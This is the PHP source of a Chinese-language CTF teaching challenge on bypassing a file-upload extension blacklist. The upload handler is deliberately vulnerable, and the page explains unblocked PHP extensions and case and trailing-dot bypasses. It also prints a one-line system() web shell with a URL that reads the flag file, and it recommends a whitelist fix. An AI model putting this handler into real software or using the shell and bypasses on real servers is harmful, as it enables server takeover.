<?php
declare(strict_types=1);
/* ------------------------------------------------------------------
 * upload3 黑名单绕过（php 后缀拉黑了？还有 phtml/php3/大小写…黑名单永远列不完）
 * 教学靶场 · 仅用于授权学习环境
 * ------------------------------------------------------------------ */

$META = json_decode(file_get_contents(__DIR__ . '/meta.json'), true);

$BLACKLIST = ['php', 'php5', 'phar', 'pht', 'phps'];   // 黑名单：拦了这些后缀……够吗？

$msg = ''; $err = '';
if (isset($_FILES['avatar'])) {
    $orig = basename((string)$_FILES['avatar']['name']);
    $ext  = strtolower(pathinfo($orig, PATHINFO_EXTENSION));
    if (in_array($ext, $BLACKLIST, true)) {
        $err = '后缀 .' . htmlspecialchars($ext) . ' 已被拉黑';
    } else {
        $name = $orig;
        if (move_uploaded_file($_FILES['avatar']['tmp_name'], __DIR__ . '/uploads/' . $name)) {
            $msg = "上传成功：uploads/" . htmlspecialchars($name);
        } else {
            $err = '上传失败（文件为空或目录不可写？）';
        }
    }
}

// 展示已上传文件（方便看到自己传了什么）
$files = array_values(array_diff(scandir(__DIR__ . '/uploads') ?: [], ['.', '..', '.gitkeep']));
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?= htmlspecialchars($META['title']) ?> · <?= htmlspecialchars($META['id']) ?></title>
<style>
:root{--bg:#0d1117;--card:#161b22;--bd:#30363d;--fg:#c9d1d9;--dim:#8b949e;--acc:#58a6ff;--ok:#3fb950;--warn:#d29922;--err:#f85149;--mono:ui-monospace,SFMono-Regular,Consolas,monospace}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--fg);font:15px/1.7 "Segoe UI","Microsoft YaHei",sans-serif;padding:0 0 60px}
.wrap{max-width:900px;margin:0 auto;padding:0 20px}
header{border-bottom:1px solid var(--bd);background:linear-gradient(180deg,#161b22,#0d1117);padding:28px 0 20px;margin-bottom:24px}
h1{font-size:24px;margin:8px 0 4px}
.badge{display:inline-block;font-size:12px;padding:2px 10px;border:1px solid var(--bd);border-radius:12px;color:var(--acc);margin-right:6px}
.badge.diff-easy{color:var(--ok)} .badge.diff-medium{color:var(--warn)} .badge.diff-hard{color:var(--err)}
.sub{color:var(--dim);font-size:13px}
.card{background:var(--card);border:1px solid var(--bd);border-radius:8px;padding:18px 20px;margin-bottom:18px}
.card h2{font-size:16px;color:var(--acc);margin-bottom:10px;border-left:3px solid var(--acc);padding-left:8px}
.card p{margin-bottom:8px}
code,.mono{font-family:var(--mono);background:#0b0f14;border:1px solid var(--bd);border-radius:4px;padding:1px 6px;font-size:13px;color:#79c0ff}
pre{background:#0b0f14;border:1px solid var(--bd);border-radius:6px;padding:12px;overflow:auto;font-family:var(--mono);font-size:13px;margin:8px 0;color:#a5d6ff}
details{border:1px solid var(--bd);border-radius:6px;padding:10px 14px;margin:8px 0;background:#10151c}
summary{cursor:pointer;color:var(--warn);font-size:14px;user-select:none}
details[open] summary{border-bottom:1px dashed var(--bd);padding-bottom:6px;margin-bottom:8px}
.hint-lv{color:var(--dim);font-size:12px}
input[type=text],input[type=file]{background:#0b0f14;border:1px solid var(--bd);color:var(--fg);border-radius:6px;padding:8px 12px;font-size:14px}
button{background:#21262d;border:1px solid var(--bd);color:var(--fg);border-radius:6px;padding:8px 18px;cursor:pointer;font-size:14px}
button:hover{border-color:var(--acc);color:var(--acc)}
#flagResult{margin-top:10px;font-size:14px;min-height:22px}
.ok{color:var(--ok)} .bad{color:var(--err)}
footer{border-top:1px solid var(--bd);margin-top:30px;padding-top:16px;color:var(--dim);font-size:13px;display:flex;justify-content:space-between}
footer a{color:var(--dim);text-decoration:none} footer a:hover{color:var(--acc)}
.form-row{margin:8px 0;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
.filelist{font-family:var(--mono);font-size:13px;color:var(--dim)}
.filelist a{color:#79c0ff;text-decoration:none}
</style>
</head>
<body>
<header><div class="wrap">
  <div><span class="badge"><?= htmlspecialchars($META['category']) ?></span><span class="badge diff-<?= htmlspecialchars($META['difficulty']) ?>">难度: <?= htmlspecialchars($META['difficulty']) ?></span></div>
  <h1><?= htmlspecialchars($META['title']) ?> <span style="color:var(--dim);font-size:14px;font-weight:400"><?= htmlspecialchars($META['id']) ?></span></h1>
  <div class="sub">CTF Web 全题型教学式靶场 · 本题仅用于授权安全学习</div>
</div></header>

<div class="wrap">

<div class="card">
  <h2>题目描述</h2>
  <p>又被 getshell 之后，开发把已知危险后缀统统拉了黑：<code>php / php5 / phar / pht / phps</code> 一律拒绝，其它后缀直接保存原文件名。</p>
  <p>可服务器解析 PHP 的方式不止一种——web 服务器（nginx/apache）按自己的规则把请求交给 PHP 解释器，能被解析成 PHP 的后缀名单，比黑名单长得多。</p>
  <p>flag 在本题目录的 <code>flag.php</code> 里（PHP 注释里，直接访问什么都看不到）。</p>
</div>

<div class="card">
  <h2>知识点充电站</h2>
  <p><b>黑名单的困境：你永远列不完</b>。PHP 可被解析的后缀取决于 web 服务器配置：</p>
  <pre>Apache httpd : AddHandler/AddType 配了哪些哪些就能跑（php/php3/php4/php5/phtml/pht…）
nginx+php-fpm: location 正则匹配到什么就转发什么（\.php$ / \.phtml$ …取决于配置）
历史上还有：phtml、php2、php3、php4、php5、php7、phps、pht、pgif…</pre>
  <p>本题环境（nginx+php-fpm）解析：<code>php / php3 / php4 / php5 / php7 / phtml / pht</code>（大小写不敏感）——黑名单只拦了其中几个。</p>
  <p>另外两个经典黑名单绕过（Apache 环境更常见）：</p>
  <pre>shell.pHp    → 大小写绕过"只拦小写 php"的写法（Linux 文件名区分大小写）
shell.php.  → 结尾加点/空格，Windows 下保存时被系统抹掉，黑名单比对时却不算 php
shell.php%20 / shell.php. （Windows + Apache 场景）</pre>
  <p style="color:var(--dim)">根治：后缀<b>白名单</b>（只允许 jpg/png/gif）+ 随机重命名 + 上传目录禁执行。</p>
  <p>getshell 后读 flag 的姿势（flag.php 内容形如 <code>&lt;?php //flag{...} ?&gt;</code>，直接访问输出空白）：</p>
  <pre>上传 shell.php 内容：&lt;?php system($_GET['c']); ?&gt;
访问：/upload1/uploads/shell.php?c=cat%20../flag.php      # 读源码即得 flag</pre>
</div>

<div class="card">
  <h2>头像上传</h2>
  <form method="POST" enctype="multipart/form-data" class="form-row">
    <input type="file" name="avatar" id="f" required>
    <button type="submit">上传</button>
  </form>
  <?php if ($msg): ?><p class="ok"><?= $msg ?></p><?php endif; ?>
  <?php if ($err): ?><p class="bad"><?= $err ?></p><?php endif; ?>
  <p class="sub">已上传文件：</p>
  <p class="filelist">
    <?php if (!$files): ?>（空）<?php else: foreach ($files as $f): ?>
      <a href="uploads/<?= rawurlencode($f) ?>"><?= htmlspecialchars($f) ?></a>&nbsp;&nbsp;
    <?php endforeach; endif; ?>
  </p>

</div>

<div class="card">
  <h2>渐进提示（先自己想，再一层层打开）</h2>
  <?php foreach ($META['hints'] as $i => $h): ?>
  <details><summary>提示 <?= $i + 1 ?> <span class="hint-lv">（第 <?= $i + 1 ?>/<?= count($META['hints']) ?> 层）</span></summary>
    <p><?= nl2br(htmlspecialchars($h)) ?></p>
  </details>
  <?php endforeach; ?>
</div>

<div class="card">
  <h2>提交 Flag</h2>
  <div class="form-row">
    <input type="text" id="flagInput" placeholder="flag{upload1_xxxxxxxx}">
    <button onclick="submitFlag()">提交</button>
  </div>
  <div id="flagResult"></div>
</div>

<footer class="wrap">
  <span><?php if ($META['prev']): ?><a href="/<?= htmlspecialchars($META['prev']) ?>">← 上一题 <?= htmlspecialchars($META['prev']) ?></a><?php endif; ?></span>
  <span>难度递进 · 教学式靶场</span>
  <span><?php if ($META['next']): ?><a href="/<?= htmlspecialchars($META['next']) ?>">下一题 <?= htmlspecialchars($META['next']) ?> →</a><?php endif; ?></span>
</footer>
</div>

<script>
async function submitFlag(){
  const box = document.getElementById('flagResult');
  const flag = document.getElementById('flagInput').value.trim();
  if(!flag) { box.textContent = '请输入 flag'; box.className='bad'; return; }
  box.textContent = '校验中...'; box.className='';
  try{
    const r = await fetch('/api/verify', {
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body: 'challenge_id=<?= urlencode($META['id']) ?>&flag=' + encodeURIComponent(flag)
    });
    const t = await r.text();
    let msg = t; try{ const j = JSON.parse(t); msg = j.message || j.msg || (j.correct!==undefined ? (j.correct?'正确 ✓':'错误 ✗') : t); }catch(e){}
    box.textContent = msg; box.className = /正确|correct|true|✓/.test(String(msg)) ? 'ok' : 'bad';
  }catch(e){
    box.textContent = '无法连接校验接口 /api/verify（本地预览属正常，联调后可用）';
    box.className = 'bad';
  }
}
</script>
</body>
</html>
